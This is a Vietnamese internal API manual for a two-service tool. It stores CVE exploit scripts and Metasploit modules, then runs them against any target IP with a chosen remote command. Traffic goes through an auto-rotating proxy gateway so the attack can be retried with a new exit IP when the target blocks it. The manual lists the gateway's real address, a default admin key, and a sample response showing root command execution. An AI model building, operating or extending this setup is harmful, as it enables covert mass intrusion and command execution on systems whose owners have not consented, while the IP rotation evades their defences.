# POC API
## Hướng dẫn sử dụng
Version 2.1  ·  Bảo mật nội bộ
Cập nhật: 7/6/2026
1. Tổng quan hệ thống
Hệ thống gồm hai dịch vụ Flask chạy song song:

| Port | Chức năng |
| --- | --- |
| 5567 | Quản lý PoC & MSF trong database (CRUD) |
| 5568 | Khai thác CVE với proxy auto-rotate |

Quy trình hoạt động:
Đăng ký node proxy qua POST /proxy/register → nhận apiKey
Gọi GET /exploits_cve?ip=...&cve=... để khai thác
Scanner tra cứu PoC/MSF trong DB, chạy pocsuite3 qua proxy gateway
Gateway tự rotate exit IP sau mỗi lần hoặc theo sticky window
2. Cấu hình
### 2.1 Biến môi trường

| Tham số | Kiểu | Bắt buộc | Mô tả |
| --- | --- | --- | --- |
| PROXY_GATEWAY_HOST | string | Không | URL admin gateway, mặc định http://80.241.217.122:3000 |
| ADMIN_API_KEY | string | Không | Key quản trị gateway, mặc định iasscan |
| GATEWAY_HTTP_PORT | int | Không | Port proxy HTTP CONNECT, mặc định 9010 |
| GATEWAY_SOCKS5_PORT | int | Không | Port proxy SOCKS5, mặc định 9080 |
| POC_BASE_DIR | string | Không | Thư mục chứa file PoC .py |
| AUTO_REGISTER_NODE | bool | Không | true = tự đăng ký node khi khởi động |

### 2.2 Proxy gateway
Scanner kết nối proxy theo format:
--proxy http://80.241.217.122:9010
--proxy-cred {apiKey}:
> **Lưu ý:** apiKey đặt ở username, password để trống. Gateway tự chọn exit IP từ pool và rotate.
3. POC Manager API  (port 5567)
Quản lý danh sách PoC và module Metasploit trong database.
### 3.1 Danh sách endpoint

| Method | Endpoint | Mô tả |
| --- | --- | --- |
| GET | /api/pocs | Lấy toàn bộ danh sách PoC |
| POST | /api/pocs | Thêm PoC mới (JSON hoặc upload file) |
| PUT | /api/pocs/<cve> | Cập nhật thông tin PoC theo CVE |
| DELETE | /api/pocs/<cve> | Xóa PoC theo CVE |
| GET | /api/pocs/search?cve= | Tìm PoC theo mã CVE |
| GET | /api/pocs/search_by_name?name= | Tìm PoC theo tên |
| GET | /api/pocs/file_by_cve/<cve> | Đọc nội dung file .py theo CVE |
| PUT | /api/pocs/file_by_cve/<cve> | Ghi đè nội dung file .py theo CVE |
| GET | /api/msf | Lấy toàn bộ module Metasploit |
| DELETE | /api/msf/<id> | Xóa MSF module theo ID |
| GET | /api/msf/search?cve= | Tìm MSF module theo CVE |

### 3.2 GET /api/pocs
Lấy toàn bộ danh sách PoC trong database.
Request
```bash
GET http://localhost:5567/api/pocs
```
Response 200
[
{
"cve": "CVE-2023-23752",
"duongdan": "mypoc_CVE_2023_23752.py",
"ten_poc": "Joomla Unauthenticated Info Disclosure",
"ten_tacgia": "admin",
"ngaytao": "2024-01-01",
"loai": "web",
"mota": "..."
}
]
### 3.3 POST /api/pocs
Thêm PoC mới. Hỗ trợ 2 cách:
#### Cách 1 – JSON (đường dẫn file đã có sẵn trên server)
```bash
POST http://localhost:5567/api/pocs
```
Content-Type: application/json
{
"cve": "CVE-2024-1234",
"duongdan": "mypoc_CVE_2024_1234.py",
"ten_poc": "Tên PoC",
"ten_tacgia": "author",
"ngaytao": "2024-06-01",
"loai": "web",
"mota": "Mô tả ngắn"
}
#### Cách 2 – Upload file (multipart/form-data)
```bash
POST http://localhost:5567/api/pocs
```
Content-Type: multipart/form-data
Fields: cve, ten_poc, ten_tacgia, ngaytao, loai, mota, file, subfolder (optional)

| Tham số | Kiểu | Bắt buộc | Mô tả |
| --- | --- | --- | --- |
| cve | string | Có | Mã CVE, VD: CVE-2024-1234 |
| ten_poc | string | Có | Tên hiển thị của PoC |
| ten_tacgia | string | Có | Tên tác giả |
| ngaytao | string | Có | Ngày tạo, định dạng YYYY-MM-DD |
| loai | string | Có | Loại: web, network, ... |
| mota | string | Có | Mô tả ngắn |
| file | file | Có | File .py PoC (tối đa 5MB) |
| subfolder | string | Không | Thư mục con trong POC_BASE_DIR |

### 3.4 PUT /api/pocs/<cve>
Cập nhật một hoặc nhiều trường của PoC. Chỉ gửi các trường muốn thay đổi.
Request
```bash
PUT http://localhost:5567/api/pocs/CVE-2023-23752
```
Content-Type: application/json
{ "mota": "Mô tả mới", "ngaycapnhat": "2024-06-07" }
Các trường được phép cập nhật:
ten_poc, ten_tacgia, ngaycapnhat, ngaytao
loai, giaothuc, mota, duongdan, tailieuthamkhao
### 3.5 Tìm kiếm PoC
```bash
GET http://localhost:5567/api/pocs/search?cve=CVE-2023
```
```bash
GET http://localhost:5567/api/pocs/search_by_name?name=joomla
```
### 3.6 Đọc / ghi nội dung file PoC
```bash
GET http://localhost:5567/api/pocs/file_by_cve/CVE-2023-23752
```
→ Trả về nội dung file .py dạng text/plain
```bash
PUT http://localhost:5567/api/pocs/file_by_cve/CVE-2023-23752
```
Content-Type: text/plain
<nội dung Python mới>
→ Ghi đè toàn bộ file .py trên server
4. POC EXPLOIT API  (port 5568)
Khai thác CVE với proxy auto-rotate. Cần đăng ký node trước khi scan.
### 4.1 Danh sách endpoint

| Method | Endpoint | Mô tả |
| --- | --- | --- |
| POST | /proxy/register | Đăng ký node với proxy gateway (làm trước tiên) |
| GET | /proxy/status | Xem trạng thái node và apiKey |
| POST | /proxy/rotate | Force-rotate sticky proxy ngay lập tức |
| GET | /exploits_cve | Scan / khai thác target theo CVE |
| GET | /health | Health check dịch vụ |

### 4.2 POST /proxy/register
Đăng ký node với gateway để lấy apiKey dùng cho proxy. apiKey được lưu tự động vào /tmp/proxy_node_credentials.json.
Request
```bash
POST http://localhost:5568/proxy/register
```
Content-Type: application/json
{ "name": "scan-node-01" }   // tên tùy chọn
Response 200
{
"success": true,
"node_id": "1c8ef83e-79ef-4560-87f8-675cc0e1863b",
"message": "Node registered. API key saved locally.",
"status": { ... }
}
> **Lưu ý:** Chỉ cần đăng ký 1 lần. Sau khi restart server, apiKey tự load lại từ file.
### 4.3 GET /proxy/status
```bash
GET http://localhost:5568/proxy/status
```
Response 200
{
"registered": true,
"node_id": "1c8ef83e-...",
"api_key_available": true,
"proxy_http_endpoint": "http://80.241.217.122:9010",
"proxy_socks5_endpoint": "socks5://80.241.217.122:9080"
}
### 4.4 POST /proxy/rotate
Xóa sticky key ngay lập tức. Lần kết nối tiếp theo sẽ lấy exit IP mới từ pool.
```bash
POST http://localhost:5568/proxy/rotate
```
Response 200
{ "success": true, "message": "Sticky proxy rotated — next scan uses new exit IP" }
### 4.5 GET /exploits_cve
Endpoint chính để khai thác CVE trên một target.
Query parameters

| Tham số | Kiểu | Bắt buộc | Mô tả |
| --- | --- | --- | --- |
| ip | string | Có | IP hoặc hostname của target |
| cve | string | Có | Mã CVE cần khai thác, VD: CVE-2023-23752 |
| port | string | Không | Port của target (mặc định: rỗng) |
| command | string | Không | Lệnh thực thi trên target (mặc định: whoami) |
| use_proxy | bool | Không | Bật/tắt proxy (mặc định: true) |
| max_retries | int | Không | Số lần retry khi bị block (mặc định: 3) |
| sticky_seconds | int | Không | Giữ sticky IP bao nhiêu giây (mặc định: 300) |
| use_socks5 | bool | Không | Dùng SOCKS5 thay HTTP CONNECT (mặc định: false) |

Ví dụ request
```bash
GET http://localhost:5568/exploits_cve?ip=192.168.1.100&cve=CVE-2023-23752&port=8080&command=id
```
Response 200 – thành công
{
"target_ip": "192.168.1.100",
"target_port": "8080",
"cve": "CVE-2023-23752",
"command": "id",
"has_poc": true,
"has_msf": false,
"scan": {
"success": true,
"output": "uid=0(root) gid=0(root)...",
"proxy_used": "http://80.241.217.122:9010",
"attempts": 1
}
}
Response 404 – không có PoC/MSF
{ "error": "No PoC or MSF module for CVE-2024-9999" }
Response 503 – chưa đăng ký node
{ "error": "Proxy node not registered. Call POST /proxy/register first." }
5. Quy trình sử dụng
### Bước 1 – Khởi động dịch vụ
# chạy trên port 5567
# chạy trên port 5568
### Bước 2 – Đăng ký node proxy (1 lần duy nhất)
```bash
curl -X POST http://localhost:5568/proxy/register \
```
-H "Content-Type: application/json" \
-d '{"name": "scan-node-01"}'
### Bước 3 – Upload PoC vào database
```bash
curl -X POST http://localhost:5567/api/pocs \
```
-F "cve=CVE-2023-23752" \
-F "ten_poc=Joomla Info Disclosure" \
-F "ten_tacgia=admin" \
-F "ngaytao=2024-01-01" \
-F "loai=web" \
-F "mota=Unauthenticated info disclosure" \
-F "file=@mypoc_CVE_2023_23752.py"
### Bước 4 – Khai thác target
```bash
curl "http://localhost:5568/exploits_cve?ip=TARGET_IP&cve=CVE-2023-23752&port=8085&command=id"
```
### Bước 5 – Nếu bị block, rotate proxy thủ công
```bash
curl -X POST http://localhost:5568/proxy/rotate
```
6. Mã lỗi HTTP

| Mã | Ý nghĩa |
| --- | --- |
| 200 | Thành công |
| 201 | Tạo mới thành công |
| 400 | Thiếu tham số hoặc dữ liệu không hợp lệ |
| 403 | Đường dẫn file nằm ngoài thư mục cho phép |
| 404 | Không tìm thấy PoC/CVE/file |
| 409 | File đã tồn tại (khi upload) |
| 413 | File upload vượt quá 5MB |
| 500 | Lỗi server nội bộ |
| 503 | Node proxy chưa đăng ký |
